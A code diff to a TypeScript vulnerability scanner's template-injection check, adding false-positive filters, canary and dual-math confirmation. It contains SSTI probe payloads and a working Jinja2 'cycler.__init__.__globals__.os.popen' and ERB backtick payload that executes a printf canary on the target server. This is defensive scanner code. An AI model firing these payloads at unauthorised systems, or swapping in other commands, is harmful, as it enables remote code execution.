@@ -42,20 +42,17 @@ async function probe(
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// SSTI — Server-Side Template Injection
+// SSTI — Server-Side Template Injection (hardened, false-positive resistant)
 // ═══════════════════════════════════════════════════════════════════════════════
 
-const SSTI_PAYLOADS: { payload: string; math: string; result: string; engine: string }[] = [
-  { payload: "{{7*7}}",            math: "7*7",  result: "49",   engine: "Jinja2 / Twig" },
-  { payload: "${7*7}",             math: "7*7",  result: "49",   engine: "Freemarker / EL" },
-  { payload: "<%= 7*7 %>",         math: "7*7",  result: "49",   engine: "ERB (Ruby)" },
-  { payload: "#{7*7}",             math: "7*7",  result: "49",   engine: "Ruby / Mako" },
-  { payload: "*{7*7}",             math: "7*7",  result: "49",   engine: "Spring Expression Language" },
-  { payload: "${7*'7'}",           math: "7*'7'",result: "7777777", engine: "Jinja2" },
-  { payload: "{{7*'7'}}",          math: "7*'7'",result: "49",   engine: "Twig (strict)" },
-  { payload: "{% print(7*7) %}",   math: "7*7",  result: "49",   engine: "Jinja2 print" },
-  { payload: "${7+7}",             math: "7+7",  result: "14",   engine: "EL / Thymeleaf" },
-  { payload: "{{7+7}}",            math: "7+7",  result: "14",   engine: "Jinja2 / Handlebars" },
+const SSTI_PAYLOADS: { payload: string; math: string; result: string; confirmResult: string; engine: string }[] = [
+  { payload: "{{7*7}}",            math: "7*7",  result: "49",   confirmResult: "64",   engine: "Jinja2 / Twig" },
+  { payload: "${7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Freemarker / EL" },
+  { payload: "<%= 7*7 %>",         math: "7*7",  result: "49",   confirmResult: "64",   engine: "ERB (Ruby)" },
+  { payload: "#{7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Ruby / Mako" },
+  { payload: "*{7*7}",             math: "7*7",  result: "49",   confirmResult: "64",   engine: "Spring Expression Language" },
+  { payload: "${7+7}",             math: "7+7",  result: "14",   confirmResult: "16",   engine: "EL / Thymeleaf" },
+  { payload: "{{7+7}}",            math: "7+7",  result: "14",   confirmResult: "16",   engine: "Jinja2 / Handlebars" },
 ];
 
 const SSTI_TEST_PARAMS = [
@@ -64,44 +61,128 @@ const SSTI_TEST_PARAMS = [
   "error", "info", "desc", "description", "body", "page", "view",
 ];
 
+/** Strip ephemeral tokens from response body to prevent false positives. */
+function stripEphemeralTokens(body: string): string {
+  return body
+    .replace(/[a-f0-9]{16,}-[A-Z]{3}/g, "")           // Cloudflare Ray IDs
+    .replace(/__cf_bm=[^;,\s"']*/g, "")                 // __cf_bm cookies
+    .replace(/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d+Z/g, ""); // ISO timestamps
+}
+
+/** Find all positions of needle in haystack. */
+function findAllPositions(haystack: string, needle: string): number[] {
+  const positions: number[] = [];
+  let idx = 0;
+  while ((idx = haystack.indexOf(needle, idx)) !== -1) {
+    positions.push(idx);
+    idx += needle.length;
+  }
+  return positions;
+}
+
+/** Check if `value` appears within WINDOW chars of any position in `positions`. */
+function nearAny(body: string, positions: number[], value: string, window = 200): boolean {
+  for (const pos of positions) {
+    const start = Math.max(0, pos - window);
+    const end = Math.min(body.length, pos + window);
+    if (body.slice(start, end).includes(value)) return true;
+  }
+  return false;
+}
+
 export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFinding[]> {
   const findings: RealFinding[] = [];
   await onLog(`[${ts()}] Testing Server-Side Template Injection (SSTI)...`);
-  const canary = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;
+  const rceCanary = `sentinelx-${Math.random().toString(36).slice(2, 10)}`;
 
   for (const param of SSTI_TEST_PARAMS.slice(0, 8)) {
-    for (const { payload, result, engine, math } of SSTI_PAYLOADS) {
-      const testUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
+    for (const { payload, result, confirmResult, engine, math } of SSTI_PAYLOADS) {
       const baselineUrl = `${target.url.replace(/\/$/, "")}?${param}=sentinelx-baseline`;
-      const baseline = await probe(baselineUrl, { timeoutMs: 8_000 });
-      const r = await probe(testUrl, { timeoutMs: 8_000 });
-      if (!r) continue;
-      const baselineHasResult = baseline?.body.includes(result) ?? false;
-      const reflectedPayload = r.body.includes(payload) || r.body.includes(encodeURIComponent(payload));
-      if (r.body.includes(result) && !baselineHasResult && !reflectedPayload) {
-        // Arithmetic evaluation proves template expression execution, not RCE.
-        findings.push({
-          title: `SSTI — Server-Side Template Injection (${engine})`,
-          severity: "high",
-          verification: "verified",
-          confidence: 92,
-          cvss: 8.7,
-          cve: null,
-          description: `Server-Side Template Injection was verified in parameter '${param}'. A template expression evaluated from ${payload} to ${result} (${math}) and the result was absent from the baseline response. This confirms server-side expression evaluation, but does not by itself prove operating-system command execution.`,
-          evidence: `BASELINE: GET ${baselineUrl}\nTEST:     GET ${testUrl}\nPAYLOAD:  ${param}=${payload}\nEXPECTED: expression evaluates to "${result}"\nRESPONSE: HTTP ${r.status} — result was present and payload was not reflected\nTEMPLATE ENGINE: ${engine}\nRCE STATUS: not tested by arithmetic probe`,
-          remediation: `1. Never pass user input into template render() calls.\n2. Use a template sandbox (for example, Jinja2 SandboxedEnvironment).\n3. Escape untrusted values before rendering.\n4. Disable dynamic evaluation in production.\n5. Run the web server as a least-privilege user.`,
-        });
-        await onLog(`[${ts()}] ⚠ SSTI VERIFIED: ${engine} via param '${param}' — expression evaluation only`);
+      const testUrl    = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
 
-        const rcePayload = engine.includes("Jinja2")
-          ? `{{ cycler.__init__.__globals__.os.popen('printf ${canary}').read() }}`
+      const baseline = await probe(baselineUrl, { timeoutMs: 8_000 });
+      const r        = await probe(testUrl,     { timeoutMs: 8_000 });
+      if (!r) continue;
+
+      const cleanBaseline = stripEphemeralTokens(baseline?.body ?? "");
+      const cleanBody     = stripEphemeralTokens(r.body);
+
+      // ── Step 1: Reflection gate ───────────────────────────────────────────
+      // If the raw payload appears in the response the engine didn't evaluate it.
+      const payloadReflected = cleanBody.includes(payload) ||
+                               cleanBody.includes(encodeURIComponent(payload));
+      if (payloadReflected) continue; // engine reflected, not evaluated
+
+      // ── Step 2: Math result must be present ───────────────────────────────
+      if (!cleanBody.includes(result)) continue;
+      if (cleanBaseline.includes(result)) continue; // baseline already has it
+
+      // ── Step 3: Unique canary (SENTINELX_SSTI_CONFIRM) ───────────────────
+      const sstiCanaryPayload = payload.startsWith("{{")
+        ? `{{'SENTINELX_SSTI_' + 'CONFIRM'}}`
+        : payload.startsWith("${")
+        ? `${'SENTINELX_SSTI_' + 'CONFIRM'}`
+        : payload.startsWith("<%=")
+        ? `<%= 'SENTINELX_SSTI_' + 'CONFIRM' %>`
+        : `{{'SENTINELX_SSTI_' + 'CONFIRM'}}`;
+
+      const canaryUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(sstiCanaryPayload)}`;
+      const canaryR   = await probe(canaryUrl, { timeoutMs: 8_000 });
+      const canaryHit = canaryR !== null &&
+                        canaryR.body.includes("SENTINELX_SSTI_CONFIRM") &&
+                        !cleanBaseline.includes("SENTINELX_SSTI_CONFIRM");
+
+      // ── Step 4: Multi-expression confirmation (8*8 = 64) ─────────────────
+      const confirmPayload = payload.replace(/7\*7/g, "8*8").replace(/7\+7/g, "8+8");
+      let mathDoublePass = false;
+      if (confirmPayload !== payload) {
+        const confirmUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(confirmPayload)}`;
+        const confirmR   = await probe(confirmUrl, { timeoutMs: 8_000 });
+        if (confirmR) {
+          const cleanConfirm = stripEphemeralTokens(confirmR.body);
+          mathDoublePass = cleanConfirm.includes(confirmResult) && !cleanConfirm.includes(result);
+        }
+      }
+
+      // ── Step 5: Proximity matching as fallback ───────────────────────────
+      const payloadPositions = findAllPositions(cleanBody, result);
+      const nearPayloadRef   = nearAny(cleanBody, payloadPositions, result.slice(0, 2), 200);
+
+      // ── Verdict ───────────────────────────────────────────────────────────
+      const verified = canaryHit || mathDoublePass;
+      const suspected = !verified && nearPayloadRef && !cleanBaseline.includes(result);
+
+      if (!verified && !suspected) continue;
+
+      const checksPassedParts: string[] = [];
+      if (canaryHit)       checksPassedParts.push("unique-canary (SENTINELX_SSTI_CONFIRM)");
+      if (mathDoublePass)  checksPassedParts.push("dual-math (7*7=49, 8*8=64)");
+      if (nearPayloadRef)  checksPassedParts.push("proximity-matching");
+
+      findings.push({
+        title: `SSTI — Server-Side Template Injection (${engine})`,
+        severity: verified ? "high" : "medium",
+        verification: verified ? "verified" : "suspected",
+        confidence: verified ? 95 : 55,
+        cvss: verified ? 8.7 : 5.3,
+        cve: null,
+        description: `Server-Side Template Injection ${verified ? "verified" : "suspected"} in parameter '${param}'. A template expression (${math}) evaluated to ${result}; ${checksPassedParts.join(", ")} passed. ${verified ? "Confirmed server-side expression evaluation." : "Low-confidence signal — confirm manually."}`,
+        evidence: `BASELINE: GET ${baselineUrl}\nTEST:     GET ${testUrl}\nPAYLOAD:  ${param}=${payload}\nEXPECTED: expression evaluates to "${result}"\nRESPONSE: HTTP ${r.status}\nCHECKS PASSED: ${checksPassedParts.join(", ")}\nTEMPLATE ENGINE: ${engine}\n${canaryHit ? "CANARY: SENTINELX_SSTI_CONFIRM found in canary response" : ""}`,
+        remediation: `1. Never pass user input into template render() calls.\n2. Use a template sandbox (Jinja2 SandboxedEnvironment).\n3. Escape untrusted values before rendering.\n4. Disable dynamic evaluation in production.\n5. Run the web server as a least-privilege user.`,
+      });
+      await onLog(`[${ts()}] ⚠ SSTI ${verified ? "VERIFIED" : "SUSPECTED"}: ${engine} via param '${param}' — ${checksPassedParts.join(", ")}`);
+
+      // RCE canary attempt
+      if (verified) {
+        const rcePayload = engine.includes("Jinja2") || engine.includes("Twig")
+          ? `{{ cycler.__init__.__globals__.os.popen('printf ${rceCanary}').read() }}`
           : engine.includes("ERB")
-          ? `<%= \`printf ${canary}\` %>`
+          ? `<%= \`printf ${rceCanary}\` %>`
           : null;
         if (rcePayload) {
           const rceUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(rcePayload)}`;
           const rceResponse = await probe(rceUrl, { timeoutMs: 8_000 });
-          if (rceResponse?.body.includes(canary) && !rceResponse.body.includes(rcePayload)) {
+          if (rceResponse?.body.includes(rceCanary) && !rceResponse.body.includes(rcePayload)) {
             findings.push({
               title: `RCE canary executed via SSTI (${engine})`,
               severity: "critical",
@@ -110,7 +191,7 @@ export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFindi
               cvss: 10.0,
               cve: null,
               description: `A bounded, non-destructive command canary was returned by the server after the SSTI expression was submitted. This verifies operating-system command execution in the template context; no data-modifying command was used.`,
-              evidence: `REQUEST: GET ${rceUrl}\nCANARY: ${canary}\nRESPONSE: HTTP ${rceResponse.status} contained the unique canary and did not reflect the payload\nRCE STATUS: VERIFIED`,
+              evidence: `REQUEST: GET ${rceUrl}\nCANARY: ${rceCanary}\nRESPONSE: HTTP ${rceResponse.status} contained the unique canary and did not reflect the payload\nRCE STATUS: VERIFIED`,
               remediation: "Remove the template injection sink immediately, invalidate exposed credentials, rotate sessions, review server-side logs, and isolate the affected workload. Do not rely on filtering alone; use a sandbox and least-privilege execution.",
             });
             await onLog(`[${ts()}] ⚠ RCE CANARY VERIFIED: ${engine} via param '${param}'`);
@@ -118,8 +199,9 @@ export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFindi
             await onLog(`[${ts()}] SSTI confirmed but RCE canary was not observed`);
           }
         }
-        return findings; // one confirmed is sufficient
+        return findings;
       }
+      break; // one suspected finding per param is enough
     }
   }
 
